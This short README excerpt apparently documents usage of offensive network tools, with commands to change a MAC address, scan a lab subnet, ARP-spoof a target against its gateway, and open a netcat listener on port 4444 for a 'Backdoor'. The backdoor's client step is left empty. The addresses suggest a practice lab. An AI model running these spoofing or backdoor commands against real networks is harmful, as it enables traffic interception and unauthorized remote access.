##Examples


```bash
    #mac changer
    python mac_changer.py -i eth0 -m 12:22:22:22:22:22
```

```bash
    #scan network
    python scan_network.py -t 10.0.2.0/24
```

```bash
    #arp spoof
    #check router ip
    route -n
    python arp_spoof.py -t 10.0.2.15 -g 10.0.2.1
```

Backdoor

```bash
    #Server.Step 1:
    nc -vv -l -p 4444
    #Client. Step 2:
    

    
```